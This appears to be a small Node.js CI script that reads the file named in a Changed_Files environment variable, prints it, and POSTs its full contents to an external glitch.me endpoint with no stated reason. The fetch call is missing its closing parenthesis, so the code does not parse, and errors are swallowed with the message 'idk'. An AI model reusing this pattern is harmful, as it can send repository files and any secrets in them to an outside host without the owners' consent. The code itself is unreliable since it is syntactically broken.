const fs = require('fs')
const files = process.env.Changed_Files

fs.readFile(files, 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading file:', err);
    process.exit(1); // Exit with error code
  } else {
    console.log('File contents:');
    console.log(data);
   try{
     fetch("https://selective-proud-club.glitch.me/UpdateF",{
       method: 'POST',
       body: JSON.stringify({content:data})
     }
   }catch{
     console.error("idk")
   }
  }
});


console.log(files)
